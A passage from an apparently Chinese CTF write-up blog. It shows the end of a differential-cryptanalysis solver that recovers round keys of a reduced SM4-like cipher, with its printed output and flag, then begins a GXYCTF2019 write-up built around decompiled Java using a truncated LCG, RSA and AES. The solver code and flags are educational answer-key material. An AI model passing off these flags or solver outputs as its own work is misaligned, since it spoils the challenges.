put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_31_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_31_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_31[j] = key_31[j] &amp; key_31_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_31[j]) &gt; <span class="number">1</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(key_31)</span></span><br><span class="line">    key_31 = get_uint32_be([list(_)[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> key_31])</span><br><span class="line">    print(<span class="string">"[+] KEY_31: "</span> + hex(key_31)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>))</span><br><span class="line">    <span class="keyword">return</span> key_31</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_30</span><span class="params">(key_31)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        cipher1[i] = (dec_one_round(cipher1[i][<span class="number">0</span>], key_31), get_uint128_be([<span class="number">0x00000022</span>] + put_uint128_be(cipher1[i][<span class="number">1</span>])[:<span class="number">3</span>]))</span><br><span class="line">        cipher1[i+<span class="number">5</span>] = (dec_one_round(cipher1[i+<span class="number">5</span>][<span class="number">0</span>], key_31), get_uint128_be([<span class="number">0x00000033</span>] + put_uint128_be(cipher1[i+<span class="number">5</span>][<span class="number">1</span>])[:<span class="number">3</span>]))</span><br><span class="line">    key_30 = [set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>]))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_30_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_30_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_30[j] = key_30[j] &amp; key_30_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_30[j]) &gt; <span class="number">2</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>]))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_30_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_30_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_30[j] = key_30[j] &amp; key_30_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_30[j]) &gt; <span class="number">1</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(key_30)</span></span><br><span class="line">    key_30 = get_uint32_be([list(_)[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> key_30])</span><br><span class="line">    print(<span class="string">"[+] KEY_30: "</span> + hex(key_30)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>))</span><br><span class="line">    <span class="keyword">return</span> key_30</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_29</span><span class="params">(key_30)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        cipher1[i] = (dec_one_round(cipher1[i][<span class="number">0</span>], key_30), get_uint128_be([<span class="number">0x00000000</span>] + put_uint128_be(cipher1[i][<span class="number">1</span>])[:<span class="number">3</span>]))</span><br><span class="line">    key_29 = [set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>]))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_29_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_29_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_29[j] = key_29[j] &amp; key_29_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_29[j]) &gt; <span class="number">2</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>]))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_29_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_29_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_29[j] = key_29[j] &amp; key_29_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_29[j]) &gt; <span class="number">1</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(key_29)</span></span><br><span class="line">    key_29 = get_uint32_be([list(_)[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> key_29])</span><br><span class="line">    print(<span class="string">"[+] KEY_29: "</span> + hex(key_29)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>))</span><br><span class="line">    <span class="keyword">return</span> key_29</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_28</span><span class="params">(key_31, key_30, key_29)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher2</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        cipher2[i] = (dec_one_round(cipher2[i][<span class="number">0</span>], key_31), dec_one_round(cipher2[i][<span class="number">1</span>], key_31))</span><br><span class="line">        cipher2[i] = (dec_one_round(cipher2[i][<span class="number">0</span>], key_30), dec_one_round(cipher2[i][<span class="number">1</span>], key_30))</span><br><span class="line">        cipher2[i] = (dec_one_round(cipher2[i][<span class="number">0</span>], key_29), dec_one_round(cipher2[i][<span class="number">1</span>], key_29))</span><br><span class="line">        cipher2[i+<span class="number">5</span>] = (dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">0</span>], key_31), dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">1</span>], key_31))</span><br><span class="line">        cipher2[i+<span class="number">5</span>] = (dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">0</span>], key_30), dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">1</span>], key_30))</span><br><span class="line">        cipher2[i+<span class="number">5</span>] = (dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">0</span>], key_29), dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">1</span>], key_29))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        cipher2[i] = (cipher2[i][<span class="number">0</span>], cipher2[i][<span class="number">0</span>] ^^ cipher2[i][<span class="number">1</span>])</span><br><span class="line">    key_28 = [set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        ct, ct_diff = cipher2[i][<span class="number">0</span>], cipher2[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>] ^^ <span class="number">0x00000022</span>))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_28_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_28_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_28[j] = key_28[j] &amp; key_28_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_28[j]) &gt; <span class="number">2</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">        ct, ct_diff = cipher2[i][<span class="number">0</span>], cipher2[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>] ^^ <span class="number">0x00000033</span>))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_28_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_28_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_28[j] = key_28[j] &amp; key_28_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_28[j]) &gt; <span class="number">1</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    key_28 = get_uint32_be([list(_)[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> key_28])</span><br><span class="line">    print(<span class="string">"[+] KEY_28: "</span> + hex(key_28)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>))</span><br><span class="line">    <span class="keyword">return</span> key_28</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(enc_flag, key)</span>:</span></span><br><span class="line">    flag = <span class="string">b''</span></span><br><span class="line">    cur_key = key.copy()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>, <span class="number">3</span>, <span class="number">-1</span>):</span><br><span class="line">        cur_key = [inv_key(cur_key, i)] + cur_key[:<span class="number">3</span>]</span><br><span class="line">        key = [cur_key[<span class="number">0</span>]] + key</span><br><span class="line">    print(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc_flag), <span class="number">32</span>):</span><br><span class="line">        ct = int(enc_flag[i:i+<span class="number">32</span>], <span class="number">16</span>)</span><br><span class="line">        ct = put_uint128_be(ct)[::<span class="number">-1</span>]</span><br><span class="line">        ct = get_uint128_be(ct)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            ct = dec_one_round(ct, key[<span class="number">31</span>-j])</span><br><span class="line">        flag += long_to_bytes(ct)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"[+] ENC_FLAG: "</span> + enc_flag)</span><br><span class="line">    key_31 = crack_key_31()</span><br><span class="line">    key_30 = crack_key_30(key_31)</span><br><span class="line">    key_29 = crack_key_29(key_30)</span><br><span class="line">    key_28 = crack_key_28(key_31, key_30, key_29)</span><br><span class="line">    flag = decrypt(enc_flag, [key_28, key_29, key_30, key_31])</span><br><span class="line">    print(<span class="string">"[+] FLAG: "</span>, end=<span class="string">""</span>)</span><br><span class="line">    print(flag)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[+] ENC_FLAG: 727c7eaf8523804472be1ff976134a65d73adba28d7345930e093b85afda0ac5b5656f7514c7736aac88a71bb6643d74</span></span><br><span class="line"><span class="string">[+] KEY_31: 0fbe90cc</span></span><br><span class="line"><span class="string">[+] KEY_30: 16c7d67f</span></span><br><span class="line"><span class="string">[+] KEY_29: 35391715</span></span><br><span class="line"><span class="string">[+] KEY_28: f28f45db</span></span><br><span class="line"><span class="string">[3882886102, 2010179002, 1572873813, 3432904981, 3427876090, 3281517115, 2835549035, 4196177867, 1356056259, 2774742866, 1808643826, 2696649042, 654419433, 3294131222, 1850743528, 2512000155, 2125249481, 1701367673, 2144276591, 2240982232, 3335194424, 4293333648, 2630048960, 3717105645, 3211860000, 304813210, 2907456674, 334588889, 4069475803, 892933909, 382195327, 264147148]</span></span><br><span class="line"><span class="string">[+] FLAG: b'flag&#123;a9028a9c58c5749cdad329c09c80cc1b&#125;\n\n\n\n\n\n\n\n\n\n'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h4 id="Link"><a href="#Link" class="headerlink" title="[Link]"></a>[Link]</h4><p><a href="https://eprint.iacr.org/2010/063.pdf" target="_blank" rel="noopener">https://eprint.iacr.org/2010/063.pdf</a></p><h3 id="flag-system"><a href="#flag-system" class="headerlink" title="flag_system"></a>flag_system</h3><h4 id="题解分析-2"><a href="#题解分析-2" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>魔改md5碰撞题- -就只有长亭拿了个一血（以后有空再补吧</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Training-Record-2</title>
      <link href="/2020/08/12/CTF-Training-Record-2/"/>
      <url>/2020/08/12/CTF-Training-Record-2/</url>
      
        <content type="html"><![CDATA[<h3 id="GXYCTF2019-CommonModulusAttack"><a href="#GXYCTF2019-CommonModulusAttack" class="headerlink" title="GXYCTF2019 - CommonModulusAttack"></a>GXYCTF2019 - CommonModulusAttack</h3><h4 id="题目考点"><a href="#题目考点" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li><a href="https://www.slideshare.net/phdays/java-35303854" target="_blank" rel="noopener">Java <code>nextInt()</code> using Truncated LCG</a></li></ul><h4 id="题目文件"><a href="#题目文件" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="GXYCTF2019-CMA.zip">Click Here to Download</a></p><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>并不知道和题目名字有什么关系- -</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] paramArrayOfString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CommonModulusAttack localCommonModulusAttack = <span class="keyword">new</span> CommonModulusAttack();</span><br><span class="line">  localCommonModulusAttack.oldtest();</span><br><span class="line">  localCommonModulusAttack.initseed();</span><br><span class="line">  localCommonModulusAttack.gen_states();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">    localCommonModulusAttack.lrandout();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"new.txt"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">24</span>; j++) &#123;</span><br><span class="line">      localPrintWriter.println(byte2hex(localCommonModulusAttack.lrandout()));</span><br><span class="line">    &#125;</span><br><span class="line">    localPrintWriter.close();</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p><strong>关键代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// key code (oldtest)</span></span><br><span class="line">PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"old.txt"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> j = <span class="keyword">this</span>.random.nextInt();</span><br><span class="line">  localPrintWriter.println(j);</span><br><span class="line">&#125;</span><br><span class="line">localPrintWriter.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (initseed)</span></span><br><span class="line">Scanner localScanner = <span class="keyword">new</span> Scanner(Paths.get(<span class="string">"flag"</span>, <span class="keyword">new</span> String[<span class="number">0</span>]), <span class="string">"UTF-8"</span>);</span><br><span class="line">String str1 = localScanner.next();</span><br><span class="line">String str2 = convert_2_binary(str1);</span><br><span class="line"><span class="keyword">this</span>.seed = str2; <span class="comment">// so what we need is `this.seed`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (generate_init_state)</span></span><br><span class="line">BigInteger localBigInteger = BigInteger.valueOf(<span class="number">0L</span>);</span><br><span class="line"><span class="keyword">char</span>[] arrayOfChar1 = <span class="keyword">this</span>.seed.toCharArray(); <span class="comment">// seed's first encryption</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k : arrayOfChar1) &#123;</span><br><span class="line">  localBigInteger = localBigInteger.shiftLeft(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (k == <span class="number">49</span>) &#123; <span class="comment">// k == '1'</span></span><br><span class="line">    localBigInteger = localBigInteger.xor(<span class="keyword">new</span> BigInteger(<span class="keyword">this</span>.seed, <span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (localBigInteger.shiftRight(<span class="number">256</span>) != BigInteger.ZERO) &#123;</span><br><span class="line">    localBigInteger = localBigInteger.xor(<span class="keyword">new</span> BigInteger(<span class="string">"10000000000000000000000000000000000000000000000000000000000000223"</span>, <span class="number">16</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> localBigInteger;</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (gen_states)</span></span><br><span class="line">BigInteger localBigInteger1 = generate_init_state(); <span class="comment">// what we want(seed after first encryption)</span></span><br><span class="line">BigInteger localBigInteger2 = BigInteger.valueOf(<span class="number">17L</span>); <span class="comment">// param e in RSA</span></span><br><span class="line">ArrayList localArrayList1 = <span class="keyword">new</span> ArrayList(<span class="number">24</span>);</span><br><span class="line">ArrayList localArrayList2 = <span class="keyword">new</span> ArrayList(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">  BigInteger localBigInteger3 = BigInteger.probablePrime(<span class="number">512</span>, <span class="keyword">this</span>.random); <span class="comment">// p</span></span><br><span class="line">  BigInteger localBigInteger4 = BigInteger.probablePrime(<span class="number">512</span>, <span class="keyword">this</span>.random); <span class="comment">// q</span></span><br><span class="line">  BigInteger localBigInteger5 = localBigInteger3.multiply(localBigInteger4); <span class="comment">// n</span></span><br><span class="line">  BigInteger localBigInteger6 = localBigInteger1.modPow(localBigInteger2, localBigInteger5); <span class="comment">// c</span></span><br><span class="line">  localArrayList1.add(localBigInteger5);</span><br><span class="line">  localArrayList2.add(localBigInteger6);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"product"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">24</span>; j++) &#123;</span><br><span class="line">    localPrintWriter.println(((BigInteger)localArrayList1.get(j)).toString());</span><br><span class="line">    <span class="keyword">this</span>.states.add(localArrayList2.get(j)); <span class="comment">// states storing seed after second encryption(RSA)</span></span><br><span class="line">  &#125;</span><br><span class="line">  localPrintWriter.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (lrandout)</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.stateselse &gt; <span class="number">0</span>) &#123; <span class="comment">// stateselse's initiation is 24</span></span><br><span class="line">  <span class="keyword">this</span>.stateselse -= <span class="number">1</span>;</span><br><span class="line">  BigInteger localBigInteger = (BigInteger)<span class="keyword">this</span>.states.get(<span class="keyword">this</span>.statespoint);</span><br><span class="line">  <span class="keyword">this</span>.statespoint += <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> stateconvert(localBigInteger); <span class="comment">// return seed after third encryption(AES)</span></span><br><span class="line">&#125; <span class="comment">// stateconvert contains `encrypt` function</span></span><br><span class="line">gen_new_states();</span><br><span class="line"><span class="keyword">return</span> lrandout();</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (gen_new_states)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">  BigInteger localBigInteger = (BigInteger)<span class="keyword">this</span>.states.get(<span class="keyword">this</span>.statespoint - <span class="number">24</span> + i); </span><br><span class="line">  <span class="keyword">byte</span>[] arrayOfByte = encrypt(localBigInteger);    </span><br><span class="line">  <span class="keyword">this</span>.states.add(<span class="keyword">new</span> BigInteger(arrayOfByte));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.stateselse += <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (encrypt)</span></span><br><span class="line">IvParameterSpec localIvParameterSpec = <span class="keyword">new</span> IvParameterSpec(<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>]);</span><br><span class="line"><span class="keyword">byte</span>[] arrayOfByte1 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">this</span>.random.nextBytes(arrayOfByte1); <span class="comment">// using random.nextBytes to genKey for 